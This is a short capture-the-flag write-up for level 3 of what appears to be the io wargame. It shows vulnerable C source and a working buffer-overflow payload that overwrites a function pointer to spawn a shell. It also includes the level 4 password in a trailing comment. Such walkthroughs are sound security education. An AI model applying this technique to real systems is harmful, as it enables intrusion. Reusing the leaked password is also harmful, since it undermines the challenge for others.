## Level 3:

Again we have access to the source file:

```c
  1 //bla, based on work by beach
  2 
  3 #include <stdio.h>
  4 #include <string.h>
  5 
  6 void good()
  7 {
  8         puts("Win.");
  9         execl("/bin/sh", "sh", NULL);
 10 }
 11 void bad()
 12 {
 13         printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
 14 }
 15 
 16 int main(int argc, char **argv, char **envp)
 17 {
 18         void (*functionpointer)(void) = bad;
 19         char buffer[50];
 20 
 21         if(argc != 2 || strlen(argv[1]) < 4)
 22                 return 0;
 23 
 24         memcpy(buffer, argv[1], strlen(argv[1]));
 25         memset(buffer, 0, strlen(argv[1]) - 4);
 26 
 27         printf("This is exciting we're going to %p\n", functionpointer);
 28         functionpointer();
 29 
 30         return 0;
 31 }
 32 

```

Looking at it, it is obvious that we need to overflow the bufferr and set the poointer for the function we want to execute. In this case we want to execute good().

Running it with some random input also gives us a hint by showing the address of the function we want to execute:

```console
level3@io:/levels$ ./level03 overflow
This is exciting we're going to 0x80484a4
I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
```

To figure out how many bytes we need to overflow the buffer and other stuff we can first 

```console
level3@io:/levels$ ./level03 $(python -c 'print "\x41" * 76 + "\x74\x84\x04\x08"')
This is exciting we're going to 0x8048474
Win.
sh-4.3$ 
```

Now we just cat the .pass to get the password for level4

<!-- Level 4 password => 7WhHa5HWMNRAYl9T -->